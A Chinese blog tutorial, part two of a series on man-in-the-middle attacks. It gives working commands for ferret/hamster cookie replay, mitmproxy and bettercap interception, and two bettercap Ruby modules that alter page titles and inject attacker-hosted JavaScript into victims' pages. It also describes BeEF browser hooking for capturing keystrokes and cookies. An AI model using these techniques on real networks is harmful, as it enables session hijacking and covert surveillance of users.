---
layout: post
title:  "细说中间人攻击（二）"
date:   2015-11-23 16:15:26
comments: true
categories: Tech
---

在[细说中间人攻击（一）][mitm-1]介绍了比较常见的中间人攻击做法，即用wireshark抓取数据包，
用ettercap来进行出入流量的替换和修改，从而达到监控和修改目标网页的目的。然而中间人攻击的工具繁多，并非只有ettercap一个，
因此这篇博文我将再介绍几种常见的MITM框架以及简单说明其使用方法，以达到方便监控目标和攻击目标的目的。

## 抓取Cookie本地重现

在我搜索中间人攻击相关主题的时候，发现国内博客提及比较多的cookie盗取所用的软件是ferret&hamster，
hamster这个软件是在**2007年**黑客大会上[Robert Graham][robert]展示用来方便在浏览器中快速重现所捕捉
到的会话的，其中ferret用来扑捉数据或者对已经扑捉的.pcap数据进行格式化处理，生成一个txt文件，然后用hamster
来读取这个txt并且在本机启动一个代理服务器，只要浏览器设置了相对应的地址（本机地址）和端口的代理
进行访问就能看见所有截获的http会话了。由于这个软件年代久远，而且只是在大会上做个demo，并不是很完善的
产品，因此也有比较大的不稳定性，即便如此在如今还是在各种博客里被屡屡提及，所以我也简单介绍下这个工具
的使用。

hamster和ferret可以到官网[http://hamster.erratasec.com](http://hamster.erratasec.com)下载，但最近似乎没有
更新了，毕竟快是十年前的东西。我是直接在robert的github上下载的c++源代码，总体功能并不复杂，就当学习一下大神
的coding方法了。有一点值得一提，hamster用的是32位的库，因此自己如果是64位操作系统，编译或者运行都需要安装
ia32-libs以及一些使用到的非标准库，同时源代码要进行简单的修改。为了方便我连同依赖直接fork到了[这里][my-hamster]。

再说使用方法，其实这倒是最简单的，关键就三步：

1. 抓取指定端口的数据

2. 用ferret格式化解析本地数据

    #ferret -r file.pcap  //生成hamster.txt

3. hamster打开本地代理服务器，默认端口是1234
    
    #hamster  //在和hamster.txt相同目录下打开

然后打开浏览器，设置代理为`127.0.0.1:1234`，打开`http://hamster`就能看到所扑捉的所有会话了，如果有cookie信息，也能直接
还原出来。其中第一步可以用任何抓包工具来做，也可以用ferret -i来抓包，这样的话1、2步也可以合并成一步。

## 中间人代理

HTTP/HTTPS代理服务器有很多，比如Fiddler2，burpsuite和mitmproxy等工具都可以建立一个代理服务器。代理服务器往往用来辅助web开发
和调试，当然也能用于渗透测试即中间人攻击。其中比较轻量级的是mitmproxy，用python编写而成，可以很容易进行拓展和定制。
mitmproxy进行HTTPS代理的过程和我在[细说中间人攻击（一）][mitm-1]的最后一节讲的大同小异，简而言之就是mitmproxy本身与服务器和
客户端双向进行SSL链接，当然前提是mitmproxy使用的证书要被信任，不然客户端进行https访问的时候浏览器地址栏会有个不信任证书的提醒。
下面介绍一下mitmproxy工具集中几个常用工具的使用方法。

### mitmproxy

mitmproxy是一个交互式的流量监控和分析工具，其操作界面的控制方式类似于vim。直接命令行打开：

    mitmproxy -p 1234

会在本地打开一个代理服务器，端口号为1234。也可以不指定，默认端口号是8080。然后使得目标通过你的这个代理上网，就能在交互界面中看到
所有的POST和GET等请求。还可以指定任意一条请求回车进入查看详细的请求数据，也可以看tab切换respond和detail数据。对于respond的数据还可以根据格式
来进行相应的展现。同时也能按e进行修改请求，然后按r进行回放。不得不说其可视化界面做得很好，所有的浏览请求一目了然。交互式的界面更适合
用于请求的分析。mitmproxy作为一个“中间人”代理，当然也能对数据进行拦截，使用i指定拦截的表达式即可。

### mitmdump

与mitmproxy相对的，mitmdump是一个非交互的抓包工具，不过还提供了用python脚本来对数据包进行修改替换的操作，有点类似于ettercap的filter插件。
可以实时修改request和respond每一个细节，当然也可以非实时地对mitmproxy保存的离线包进行操作。

    mitmdump -n -r capture.data -w output.data [filter]

其中capture.data是mitmproxy用w键保存的数据。mitmdump可以对其过滤处理产生新的包。[filter]是过滤的条件，如“~d douban.com“表示特定域名，~h表示
特定header等等。对于新生成的数据包，我们也可以用mitmdump重播：

    mitmdump -n -c output.data

### libmproxy

mitmdump的一个主要作用是支持inline脚本，用--script调用，脚本中用到了mitmdump提供的拓展库libmproxy，就像其他python第三方库一样，不过其拥有操纵
http响应每个细节的能力，实乃居家旅行必备。用法很简单：

    mitmdump -s myscript.py -p 1234

如一个修改响应文字内容的inline脚本如下：

    # Usage: mitmdump -s "modify_response_body.py mitmproxy bananas"
    # (this script works best with --anticache)
    from libmproxy.models import decoded
    
    
    def start(context, argv):
        if len(argv) != 3:
            raise ValueError('Usage: -s "modify-response-body.py old new"')
        # You may want to use Python's argparse for more sophisticated argument
        # parsing.
        context.old, context.new = argv[1], argv[2]
    
    
    def response(context, flow):
        with decoded(flow.response):  # automatically decode gzipped responses.
            flow.response.content = flow.response.content.replace(
                context.old,
                context.new)

这里需要注意的是不同版本的libmproxy的改动非常大！！我之前是直接apt-get下载的mitmproxy0.8，那时
还没有libmproxy.models，所以要注意自己的版本。建议在github上clone最新版本，用pip+virturlenv进行
包管理十分方便，目前最新版本是mitmproxy0.14.x，最新版还增加了一个mitmweb的工具，
可见其更新速度非常快，这对开源工具来说是一件大好事。

另外在github仓库里还有inline脚本的example，文档也很齐全。除了inline调用以外，我们甚至可以使用libmproxy
来自己用python写一个mitmproxy！而且实现起来也非常简单，因为mitmproxy本身大部分功能都是基于libmproxy里实现的。

## "更好的ettercap"——bettercap

很多人可能会问，既然有了ettercap，干嘛还要再弄一个差不多的东西？其实按照bettercap作者的说法，ettercap虽然是个很棒的工具，
但是已经过时了，而且似乎维护也是有气无力。ettercap在大型网络中相当不稳定，在操纵http的payload时往往还需要别的工具来辅助，
比如上面提到的mitmproxy。因此bettercap就诞生啦！

bettercap的操作也十分简单明了，比如在局域网中嗅探所有数据：

    bettercap -X -P "FTP,HTTPAUTH,MAIL,NTLMSS"

其中-P指定加载的parsers，也可以不指定，默认和ettercap一样全部加载。也可以将数据保存在本地：

    bettercap --sniffer --sniffer-pcap=http.pcap --sniffer-filter "tcp and dst port 80"

--sniffer-filter参数表示的意思很明显，即只保存目的端口为80的tcp数据（即http）。值得一提的是，这里没有指定网关和网络接口，因为
用的都是默认值，即当前网关和当前默认网卡，当然也可以分别用-G 和 -I 指定。

### 模块化的透明代理

上面讲mitmproxy的时候已经介绍了代理，而bettercap正好也可以实现类似的功能，在本地启动一个中间人代理服务器并且将数据流量都通过代理收发。

    bettercap --proxy --proxy-port=1234

指定代理端口为1234，默认为8080。这条命令默认只记录http请求，如果指定--proxy-module参数就可以加载你自定义的模块来操纵流量。
自定义的拓展模块用Ruby写成，语法很简单，比如一个修改网页title的例子`hack_title.rb`如下：

    class HackTitle < Proxy::Module  
      def on_request( request, response )
        # is it a html page?
        if response.content_type =~ /^text\/html.*/
          Logger.info "Hacking http://#{request.host}#{request.url} title tag"
          # make sure to use sub! or gsub! to update the instance
          response.body.sub!( '<title>', '<title> !!! HACKED !!! ' )
        end
      end
    end  
    
调用方法

    bettercap --proxy --proxy-module=hack_title.rb

### 内嵌http服务器

其实这个选项比较鸡肋，不过也是bettercap为了达到它所说的“只用一个工具”的效果吧。其主要用途就是给payload注入JS的时候需要从服务器去请求，
bettercap可以配合proxy module很容易一步实现：

    bettercap --httpd --http-path=/path/to/your/js/file/ --proxy --proxy-module=inject.rb

其中inject.rb的代码如下：

    class InjectJS < Proxy::Module  
      def on_request( request, response )
        # is it a html page?
        if response.content_type =~ /^text\/html.*/
          Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
          # get the local interface address and HTTPD port
          localaddr = Context.get.ifconfig[:ip_saddr]
          localport = Context.get.options[:httpd_port]
          # inject the js
          response.body.sub!( '</title>', "</title><script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script>" )
        end
      end
    end  

目前bettercap的功能还比较简单，但优点是其更新维护非常快，可以说是日新月异，和ettercap等老古董形成鲜明对比呀:D

## BeEF

BeEF全称为Browser Exploitation Framework，是一个著名的浏览器劫持框架，也是采用Ruby编写。虽然安装依赖的过程有点繁琐，但用起来着实简单无比，
只需要运行：
    
    ./beef

运行后会启动一个用户接口服务器和一个挂载BeEF主要JS脚本（hook.js）的服务器，其架构如下：

![BeEF-overall](http://images2015.cnblogs.com/blog/676200/201511/676200-20151123192955467-1825550887.png)

其中用户接口也是一个http服务器，我们只需要在浏览器中打开，就能进入一个展现所有被注入的客户机的管理后台。如果客户端浏览的某个网页payload中加载
了hook.js，那么其一举一动都会发送到我们的UI服务器上，包括鼠标的点击事件，点击位置，键盘事件等等，查看cookie和客户端的机器信息更是不在话下：

![hook-interface](http://images2015.cnblogs.com/blog/676200/201511/676200-20151123193727405-301424133.png)

针对每一台被劫持的客户端（浏览器），我们还可以对其发送不同的指令，比如播放音乐，锁住页面，打开web摄像头。值得一提的是，BeEF还能配合metasploit
来入侵目标的电脑，从而在目标关闭浏览器后依旧能拥有其计算机的控制权。

## 后记

中间人攻击的大致方法至此就介绍得差不多了，在总结的过程中自己也学了不少工具的的用法。虽然MITM的工具繁多，但明白其原理才能更好地去使用，
以及对其进行拓展。轮子是个好东西，人类只有几十年有效寿命和有限的精力，却能够不断发展到现在这样科技发达，靠的就是不断理解和使用轮子，把前人
的推论当成定理，可以说人类社会的进步就是一个面向对象编程的过程。但是，也不用把别人的轮子看得过于神秘，说到底中间人也就是接收，解析，发送三步而已。
至于怎么防御这类攻击，最好的方法就是浏览器禁cookie，禁javascript，禁flash，最终还是得和个人的上网体验相权衡，毕竟如果把眼睛都蒙上了，我还上什么网呢。


[mitm-1]: http://pannzh.github.io/tech/2015/11/01/mitm-detail-1.html
[robert]: https://github.com/robertdavidgraham
[my-hamster]: https://github.com/pannzh/hamster
